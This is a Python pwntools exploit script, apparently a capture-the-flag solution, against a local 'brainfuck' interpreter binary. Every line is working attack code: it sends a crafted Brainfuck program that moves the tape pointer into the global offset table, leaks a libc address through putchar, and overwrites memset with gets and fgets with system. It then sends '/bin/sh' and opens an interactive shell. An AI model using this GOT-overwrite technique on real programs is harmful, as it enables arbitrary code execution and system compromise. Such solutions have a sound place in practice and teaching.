from pwn import *

exe = ELF("./brainfuck_patched")
libc = ELF("./libc.so.6")

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

args.DEBUG = True

def conn():
    r = process([exe.path])
    if args.DEBUG:
        gdb.attach(r, gdbscript=gdbscript)

    return r

def change_ptr():
    return "<" * 32 + "," + "."

def leak_libc():
    return ".>" * 4 + "<" * 4 + ",>" * 4

def overwrite_memset_with_gets():
    return "<" * 8 + ",>" * 4

def overwrite_fgets_with_system():
    return "<" * 32 + ",>" * 4
    
def main():
    r = conn()

    payload = change_ptr()
    payload += leak_libc()
    payload += overwrite_memset_with_gets()
    payload += overwrite_fgets_with_system() + "."
    
    r.sendlineafter(b"[ ]", payload.encode())
    r.send(b"\x30")
    
    leak = int.from_bytes(r.recvuntil(b"\xf7")[2:], "little")
    libc.address = leak - libc.symbols.putchar
    log.success(f"LEAKED LIBC: {hex(libc.address)}")
    
    r.send(pack(exe.symbols._start))
    r.send(pack(libc.symbols.gets))
    r.send(pack(libc.symbols.system))

    r.sendline(b"/bin/sh\x00")

    r.interactive()

if __name__ == "__main__":
    main()
